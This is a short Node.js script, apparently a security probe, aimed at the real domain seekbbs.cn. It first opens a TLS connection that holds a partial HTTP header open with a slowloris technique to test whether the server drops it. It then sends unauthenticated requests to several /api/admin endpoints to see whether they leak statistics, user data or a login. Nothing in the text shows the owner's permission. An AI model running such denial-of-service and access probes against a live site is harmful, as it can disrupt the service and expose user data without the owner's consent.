
const https = require('https');
const tls = require('tls');
const agent = new https.Agent({ keepAlive: true });
function rq(opts) {
  return new Promise((res) => {
    const t0 = Date.now();
    const r = https.request({ host: 'seekbbs.cn', port: 443, agent, ...opts }, (resp) => {
      let d = ''; resp.on('data', c => d += c); resp.on('end', () => res({ code: resp.statusCode, h: resp.headers, body: d, ms: Date.now() - t0 }));
    });
    r.on('error', e => res({ code: 0, err: e.code }));
    r.end();
  });
}
(async () => {
  console.log('== slowloris: 1 conn, partial header, cap 15s ==');
  await new Promise((res) => {
    const t0 = Date.now();
    const s = tls.connect({ host: 'seekbbs.cn', port: 443, servername: 'seekbbs.cn', rejectUnauthorized: false }, () => {
      s.write('GET / HTTP/1.1\r\nHost: seekbbs.cn\r\nX-Slow: ');
      const iv = setInterval(() => { try { s.write('a'); } catch {} }, 2000);
      const done = (why) => { clearInterval(iv); console.log('  closed/ended after ' + ((Date.now() - t0) / 1000).toFixed(1) + 's ->', why); try { s.destroy(); } catch {} res(); };
      s.on('close', () => done('socket close'));
      s.on('end', () => done('server end'));
      s.on('error', (e) => done('error ' + e.code));
      setTimeout(() => done('NOT closed at 15s (timeout survives)'), 15000);
    });
    s.on('error', (e) => { console.log('  connect err', e.code); res(); });
  });

  console.log('== admin API without auth ==');
  for (const p of ['/api/admin/stats', '/api/admin/users', '/api/admin/login']) {
    const x = await rq({ path: p, method: p.endsWith('login') ? 'POST' : 'GET', headers: { 'Content-Type': 'application/json' }, body: p.endsWith('login') ? '{}' : undefined });
    console.log('  ' + p.padEnd(20), x.code, (x.body || '').replace(/\s+/g, ' ').slice(0, 100));
  }
  agent.destroy();
})();
